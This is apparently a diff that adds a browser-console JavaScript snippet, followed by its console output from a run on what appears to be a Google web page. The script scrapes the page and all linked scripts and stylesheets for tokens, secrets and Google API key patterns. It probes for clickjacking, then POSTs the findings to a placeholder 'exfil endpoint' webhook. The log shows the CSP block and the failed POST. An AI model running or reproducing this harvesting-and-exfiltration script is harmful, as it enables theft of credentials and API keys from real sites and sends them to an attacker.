@@ -1,0 +1,88 @@
+(async (terms, exfilUrl) => {
+    const results = [];
+
+    const searchContent = (content, url) => {
+        content.split('\n').forEach((line, index) => {
+            if (terms.some(term => line.toLowerCase().includes(term.toLowerCase()))) {
+                results.push(`[${url}] Line ${index + 1}: ${line.trim()}`);
+            }
+        });
+    };
+
+    // Scan page DOM
+    searchContent(document.documentElement.outerHTML, window.location.href);
+
+    // Fetch & scan linked scripts and styles
+    const fetchAndSearch = async (url) => {
+        try {
+            const res = await fetch(url);
+            const text = await res.text();
+            searchContent(text, url);
+        } catch (e) {
+            // Fail silently
+        }
+    };
+
+    const urls = [...document.querySelectorAll('link[rel="stylesheet"], script[src]')]
+        .map(el => el.href || el.src);
+    await Promise.all(urls.map(fetchAndSearch));
+
+    // Clickjacking detection (CSP-safe)
+    const iframe = document.createElement("iframe");
+    iframe.src = "https://www.google.com";
+    iframe.style.width = "1px";
+    iframe.style.height = "1px";
+    iframe.style.position = "absolute";
+    iframe.style.left = "-9999px";
+    document.body.appendChild(iframe);
+
+    setTimeout(() => {
+        if (!iframe.contentWindow) {
+            results.push("[+] Iframe blocked — X-Frame-Options or CSP detected.");
+        } else {
+            results.push("[-] Iframe NOT blocked — potential clickjacking vector.");
+        }
+    }, 1500);
+
+    // Wait to collect iframe result
+    await new Promise(resolve => setTimeout(resolve, 2000));
+
+    // Exfiltrate via webhook
+    const payload = {
+        url: window.location.href,
+        origin: location.origin,
+        timestamp: new Date().toISOString(),
+        results: results.slice(0, 50), // limit size
+    };
+
+    fetch(exfilUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+    });
+
+})([
+    'secret', 'token', 'bearer', 'api', 'key', 'jwt', 'auth', 'authorization', 'client_id',
+    'client_secret', 'access_token', 'refresh_token', 'google', 'firebase', 'maps.googleapis.com',
+    'api_key', 'AIza', 'AIzaSy', 'AIzaS', 'AIzaT', 'AIzaU', 'AIzaV', 'AIzaW', 'AIzaX', 'AIzaY',
+    'AIzaZ', 'AIza0', 'AIza1', 'AIza2', 'AIza3', 'AIza4', 'AIza5', 'AIza6', 'AIza7', 'AIza8',
+    'AIza9', 'oauth', 'gapi', 'service_account', 'cloudfunction', 'firebaseio', 'realtime',
+    'storage.googleapis.com', 'credentials', 'googleapis.com', 'v3', 'gcloud', 'gserviceaccount',
+    'bigquery', 'cloudsql', 'identitytoolkit'
+], 'https://your-webhook-url'); // <-- replace with your exfil endpoint
+
+23:07:13.764 Promise {<pending>}
+23:07:14.771 Refused to frame 'https://www.google.com/' because it violates the following Content Security Policy directive: "frame-src 'self' https://calendar.google.com/accounts/ https://ogs.google.com https://onegoogle-autopush.corp.google.com https://onegoogle-autopush.sandbox.google.com https://onegoogle-staging.corp.google.com https://onegoogle-staging.sandbox.google.com https://myaccount.google.com/accounts/ https://myaccount.google.com/profile-picture https://myaccount.google.com/profile-picture/ https://accounts.google.com/RotateCookiesPage https://accounts.google.com/ https://apis.google.com/u/ https://apis.google.com/_/streamwidgets/ https://clients6.google.com/static/ https://content.googleapis.com/static/ https://mail-attachment.googleusercontent.com/ https://www.google.com/calendar/ https://calendar.google.com/calendar/ https://docs.google.com/ https://drive.google.com https://*.googleusercontent.com/docs/securesc/ blob: https://feedback.googleusercontent.com/resources/ https://www.google.com/tools/feedback/ https://support.google.com/inapp/ https://*.googleusercontent.com/gadgets/ifr https://hangouts.google.com/ https://talkgadget.google.com/ https://*.talkgadget.google.com/ https://www-gm-opensocial.googleusercontent.com/gadgets/ https://www-onepick-opensocial.googleusercontent.com/gadgets/ https://plus.google.com/ https://wallet.google.com/gmail/ https://www.youtube.com/embed/ https://www.youtubeeducation.com/embed/ https://clients5.google.com/pagead/drt/dn/ https://clients5.google.com/ads/measurement/jn/ https://www.gstatic.com/mail/ww/ https://www.gstatic.com/mail/intl/ https://clients5.google.com/webstore/wall/ https://ci3.googleusercontent.com/ https://workspace.google.com/u/ https://workspace.google.com/marketplace/appfinder https://www.gstatic.com/mail/promo/ https://notifications.google.com/ https://tracedepot-pa.clients6.google.com/static/ https://one.google.com/ https://clients4.google.com/insights/consumersurveys/ https://scone-pa.clients6.google.com/ https://feedback-pa.clients6.google.com/ https://staging-taskassist-pa-googleapis.sandbox.google.com https://taskassist-pa.clients6.google.com https://staging-appsgrowthpromo-pa-googleapis.sandbox.google.com https://appsgrowthpromo-pa.clients6.google.com https://dasher-workspace-sandbox.corp.google.com https://login.corp.google.com https://content-googleapis-test.sandbox.google.com https://clients6.google.com https://lynx-test.corp.google.com https://docs-dev-sheets-googleapis.sandbox.google.com https://sheets.clients6.google.com https://adssettings.google.com https://*.prod.amp4mail.googleusercontent.com/ https://chat.google.com/ https://*.client-channel.google.com/client-channel/client https://clients4.google.com/invalidation/lcs/client https://tasks.google.com/ https://keep.google.com https://addons.gsuite.google.com https://meet.google.com https://contacts.google.com https://workspace.google.com https://*.googleusercontent.com/confidential-mail/attachments/ https://cse.mail.google.com/".
+
+23:07:17.126 VM1799:58 
+        
+        
+       POST https://your-webhook-url/ net::ERR_NAME_NOT_RESOLVED
+(anonymous) @ VM1799:58
+await in (anonymous) (async)
+(anonymous) @ VM1799:64
+23:07:17.135 VM1799:58 
+        
+        
+       Uncaught (in promise) TypeError: Failed to fetch
+    at <anonymous>:58:5
